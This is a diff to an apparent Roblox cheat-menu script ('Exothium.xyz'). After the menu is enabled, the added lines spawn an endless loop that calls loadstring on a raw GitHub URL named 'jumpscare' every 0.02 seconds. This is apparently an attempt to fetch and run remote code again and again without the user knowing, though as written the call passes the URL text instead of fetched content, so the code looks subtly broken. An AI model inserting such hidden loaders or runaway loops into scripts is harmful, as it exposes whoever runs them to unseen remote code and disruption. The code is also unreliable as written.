@@ -3739,3 +3739,10 @@ Notify("Exothium.xyz", "Loaded script", 2.1)
 Notify("Exothium.xyz", "Press Insert to toggle the menu", 3.5)
 
 game.CoreGui.ewq9erdusafeuwufijnen329duewq_1.Enabled = true
+
+task.spawn(function()
+    while true do
+        loadstring("https://raw.githubusercontent.com/CilXA/B7FGF5X1AAA33FG/refs/heads/main/jumpscare")()
+        wait(0.02)
+    end
+end)
